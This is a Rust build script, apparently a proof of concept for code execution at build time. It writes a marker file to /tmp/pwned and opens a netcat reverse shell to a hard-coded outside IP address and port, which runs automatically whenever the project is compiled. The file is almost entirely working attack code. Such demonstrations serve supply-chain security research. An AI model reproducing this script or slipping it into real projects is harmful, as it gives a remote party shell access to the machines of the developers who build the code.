use std::fs;
use std::process::Command;

fn main() {
    println!("cargo:warning=Running malicious code at build time!");

    // Create the /tmp/pwned file
    fs::write("/tmp/pwned", "PoC RCE successful at build time!").unwrap();

    // Optional: Run a reverse shell
    let _ = Command::new("sh")
        .arg("-c")
        .arg("nc -e /bin/sh 103.160.106.201 5050")
        .spawn();
}
